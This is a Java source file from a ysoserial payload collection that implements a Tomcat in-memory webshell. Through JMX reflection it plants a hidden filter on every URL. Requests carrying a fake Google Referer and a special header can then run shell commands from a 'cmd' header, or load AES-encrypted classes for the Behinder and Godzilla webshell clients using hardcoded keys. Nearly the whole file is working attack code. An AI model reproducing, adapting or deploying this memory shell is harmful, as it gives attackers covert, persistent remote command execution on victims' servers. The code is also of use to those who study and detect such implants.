package ysoserial.payloads.templates;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.http.Parameters;
import org.apache.tomcat.util.modeler.Registry;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;

public class TomcatFilterMemShellFromJMX extends AbstractTranslet implements Filter {
    // 适用范围: Tomcat 7 ~ 9
    static {
        try {
            String filterName = "MyFilterVersion" + System.nanoTime();
            String urlPattern = "/*";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            if (objectSet.size() == 0) {
                // springboot的jmx中为Tomcat而非Catalina
                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            }
            for (NamedObject namedObject : objectSet) {
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext) field.get(obj);

                field = standardContext.getClass().getDeclaredField("filterConfigs");
                field.setAccessible(true);
                HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                if (map.get(filterName) == null) {
                    //生成 FilterDef
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterDefClass = null;
                    try {
                        filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                    } catch (ClassNotFoundException e) {
                        filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                    }

                    Object filterDef = filterDefClass.newInstance();
                    filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, filterName);
                    Filter filter = new TomcatFilterMemShellFromJMX();

                    filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, filter.getClass().getName());
                    filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, filter);
                    standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, filterDef);

                    //设置 FilterMap
                    //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
                    Class filterMapClass = null;
                    try {
                        filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                    } catch (ClassNotFoundException e) {
                        filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    }

                    Object filterMap = filterMapClass.newInstance();
                    filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, filterName);
                    filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, DispatcherType.REQUEST.name());
                    filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, urlPattern);
                    //调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了
                    standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, filterMap);

                    //设置 FilterConfig
                    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
                    constructor.setAccessible(true);
                    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                    map.put(filterName, filterConfig);
                }
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
    }

    String xc = "3c6e0b8a9c15224a"; // key
    String pass = "pass";
    String md5 = md5(pass + xc);
    Class payload;

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            // 入口
            if (request.getHeader("Referer").equalsIgnoreCase("https://www.google.com/")) {
                Object lastRequest = request;
                Object lastResponse = response;
                // 解决包装类RequestWrapper的问题
                // 详细描述见 https://github.com/rebeyond/Behinder/issues/187
                if (!(lastRequest instanceof RequestFacade)) {
                    Method getRequest = ServletRequestWrapper.class.getMethod("getRequest");
                    lastRequest = getRequest.invoke(request);
                    while (true) {
                        if (lastRequest instanceof RequestFacade) break;
                        lastRequest = getRequest.invoke(lastRequest);
                    }
                }
                // 解决包装类ResponseWrapper的问题
                if (!(lastResponse instanceof ResponseFacade)) {
                    Method getResponse = ServletResponseWrapper.class.getMethod("getResponse");
                    lastResponse = getResponse.invoke(response);
                    while (true) {
                        if (lastResponse instanceof ResponseFacade) break;
                        lastResponse = getResponse.invoke(lastResponse);
                    }
                }
                // cmdshell
                if (request.getHeader("x-client-data").equalsIgnoreCase("cmd")) {
                    String cmd = request.getHeader("cmd");
                    if (cmd != null && !cmd.isEmpty()) {
                        String[] cmds = null;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            cmds = new String[]{"cmd", "/c", cmd};
                        } else {
                            cmds = new String[]{"/bin/bash", "-c", cmd};
                        }
                        String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                        ((ResponseFacade) lastResponse).getWriter().println(result);
                    }
                } else if (request.getHeader("x-client-data").equalsIgnoreCase("rebeyond")) {
                    if (request.getMethod().equals("POST")) {
                        // 创建pageContext
                        HashMap pageContext = new HashMap();

                        // lastRequest的session是没有被包装的session!!
                        HttpSession session = ((RequestFacade) lastRequest).getSession();
                        pageContext.put("request", lastRequest);
                        pageContext.put("response", lastResponse);
                        pageContext.put("session", session);
                        // 这里判断payload是否为空 因为在springboot2.6.3测试时request.getReader().readLine()可以获取到而采取拼接的话为空字符串
                        String payload = request.getReader().readLine();
                        if (payload == null || payload.isEmpty()) {
                            payload = "";
                            // 拿到真实的Request对象而非门面模式的RequestFacade
                            Field field = lastRequest.getClass().getDeclaredField("request");
                            field.setAccessible(true);
                            Request realRequest = (Request) field.get(lastRequest);
                            // 从coyoteRequest中拼接body参数
                            Field coyoteRequestField = realRequest.getClass().getDeclaredField("coyoteRequest");
                            coyoteRequestField.setAccessible(true);
                            org.apache.coyote.Request coyoteRequest = (org.apache.coyote.Request) coyoteRequestField.get(realRequest);
                            Parameters parameters = coyoteRequest.getParameters();
                            Field paramHashValues = parameters.getClass().getDeclaredField("paramHashValues");
                            paramHashValues.setAccessible(true);
                            LinkedHashMap paramMap = (LinkedHashMap) paramHashValues.get(parameters);

                            Iterator<Map.Entry<String, ArrayList<String>>> iterator = paramMap.entrySet().iterator();
                            while (iterator.hasNext()) {
                                Map.Entry<String, ArrayList<String>> next = iterator.next();
                                String paramKey = next.getKey().replaceAll(" ", "+");
                                ArrayList<String> paramValueList = next.getValue();
                                if (paramValueList.size() == 0) {
                                    payload = payload + paramKey;
                                } else {
                                    payload = payload + paramKey + "=" + paramValueList.get(0);
                                }
                            }
                        }

//                        System.out.println(payload);
                        // 冰蝎逻辑
                        String k = "e45e329feb5d925b"; // rebeyond
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        method.setAccessible(true);
                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload));
                        Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                        evilclass.newInstance().equals(pageContext);
                    }
                } else if (request.getHeader("x-client-data").equalsIgnoreCase("godzilla")) {
                    // 哥斯拉是通过 localhost/?pass=payload 传参 不存在包装类问题
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = x(data, false);
                    if (payload == null) {
                        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
                        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defMethod.setAccessible(true);
                        payload = (Class) defMethod.invoke(urlClassLoader, data, 0, data.length);
                    } else {
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        f.equals(request);
                        response.getWriter().write(md5.substring(0, 16));
                        f.toString();
                        response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                        response.getWriter().write(md5.substring(16));
                    }
                }
                return;
            }
        } catch (Exception e) {
//            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void destroy() {

    }
}
